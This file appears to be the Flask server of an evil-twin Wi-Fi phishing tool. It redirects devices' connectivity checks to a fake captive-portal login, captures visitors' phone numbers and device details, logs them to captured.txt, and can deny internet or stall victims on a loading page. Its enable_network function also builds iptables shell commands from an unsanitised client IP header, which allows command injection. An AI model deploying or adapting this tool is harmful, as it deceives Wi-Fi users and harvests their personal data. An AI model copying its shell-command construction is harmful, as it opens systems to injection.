from flask import Flask, redirect, url_for, request, render_template
import os
import argparse
import datetime
import flask.cli
import logging
import re

parser = argparse.ArgumentParser(description='MFCP http server options help')
parser._action_groups.pop()
requiredNamed = parser.add_argument_group('required') ### REQUIRED ARGS ###
requiredNamed.add_argument(
        "-t",
        "--template",
        type=str,
        required=True,
        help=("Template " +
            "Example: -t [template_name]"))
requiredNamed.add_argument(
        "-p",
        "--port",
        type=int,
        required=True,
        help=("Choose port for python http server. " +
            "All processes on that port will be killed! " + 
            "Example: -p 80"))
optionalNamed = parser.add_argument_group('optional') ### OPTIONAL ARGS ###
optionalNamed.add_argument(
        "-l",
        "--local",
        action='store_true',
        required=False,
        help=("Local mode. " +
            "Uses localhost as default hostname " + 
            "Use if you are making captive portal templates " +
            "Example: -l"))
optionalNamed.add_argument(
        "-n",
        "--nointernet",
        action='store_true',
        required=False,
        help=("Do not enable internet after client login successfuly. " +
            "Example: -n"))
optionalNamed.add_argument(
        "-v",
        "--verbose",
        action='store_true',
        required=False,
        help=("Unhide default flask messages like GET/POST etc. " +
            "Example: -v"))

args = parser.parse_args()

PORT = (args.port)
template = args.template

flask.cli.show_server_banner = lambda *args: None # disable flask app default messages

if args.verbose is False:
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)

app = Flask(__name__)

def phone_validation(phone):
    pattern = r"^\+7[0-9]{10}$"
    if re.match(pattern, phone):
        return True
    return False

def enable_network(client_ip):
    os.system("iptables -t nat -I PREROUTING 1 -s " + client_ip + " -j ACCEPT")
    os.system("iptables -I FORWARD -s " + client_ip + " -j ACCEPT")
    request.close()  # close redirection page so device will check for network

@app.route('/redirect_page/')
def redirect_page():
    return render_template('%s/redirect.html' % (template)) 

blacklist = []

@app.route("/", methods=["POST", "GET"])
def login():
    user_agent = request.headers.get('User-Agent')
    user_agent_os = str(request.user_agent.platform)
    user_agent_browser = str(request.user_agent.browser)
    user_agent_version = str(request.user_agent.version)
    user_agent_string = str(request.user_agent.string)

    client = None
    if request.environ.get('HTTP_X_REAL_IP') is not None:
        client = str(request.environ.get('HTTP_X_REAL_IP'))
    else:
        client = str(request.environ.get('REMOTE_ADDR'))

    if client not in blacklist:
        blacklist.append(client)
        print(f"[INFO] {client} connected | OS: {user_agent_os} | Browser: {user_agent_browser}")
        print(f"[INFO] Full User Agent: {user_agent}")

    error = None
    if request.method == "POST":

        current_date = str(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        phone = request.form['phone']

        if phone == '':
            print("[INFO] Catched empty input, sending error message to client!")
            error = "Phone number can't be empty!"
            return render_template('%s/login.html' % (template), error=error) 
        if phone_validation(phone) == False:
            print("[INFO] Catched invalid phone number, sending error message to client!")
            error = "Неверный формат номера - используйте +7XXXXXXXXXX"
            return render_template('%s/login.html' % (template), error=error) 

        else:
            print("[CREDS] Captured client input!")
            print(f"""
----------------------------
Date: {current_date}
----------------------------
Phone: {phone}
----------------------------
User Agent: {user_agent}
----------------------------
OS: {user_agent_os}
Browser: {user_agent_browser}
Version: {user_agent_version}
Full UA String: {user_agent_string}
----------------------------
""")    
            with open("captured.txt", "a") as file:
                file.write(f"""
Date: {current_date}
|
Phone: {phone}
|
User Agent: {user_agent}
|
OS: {user_agent_os}
Browser: {user_agent_browser}
Version: {user_agent_version}
Full UA String: {user_agent_string}
----------------------------
""")
            if args.nointernet:
                print(f"[INFO] No internet option is enabled, keeping internet access disabled for: {client}")
            else:
                print(f"[ACTION] Enabling internet access for: {client}")
                enable_network(client)
            
            # Induce infinite loading
            return render_template('%s/loading.html' % (template))
    else:
        return render_template('%s/login.html' % (template), code=302) 

@app.route('/generate_204')
@app.route('/gen_204')
@app.route('/hotspot-detect.html')
def android():
    return redirect("http://10.0.0.1/", code=302)

@app.route('/favicon.ico')
def favicon():
    return app.send_static_file('favicon.ico')

if __name__ == '__main__':
    print("[ MFCP Flask Server v1.0 ]")

    if args.local:
        HOST_NAME = "127.0.0.1"
        print(f"[INFO] Using local hostname for testing captive portal templates: {HOST_NAME}. Thanks for support!") 
    else:
        HOST_NAME = "10.0.0.1"

    print(f"[INFO] Server started http://{HOST_NAME}:{PORT}")
    try:
        app.run(host=HOST_NAME, port=PORT)
    except KeyboardInterrupt:
        pass
        print("\nServer stopped")
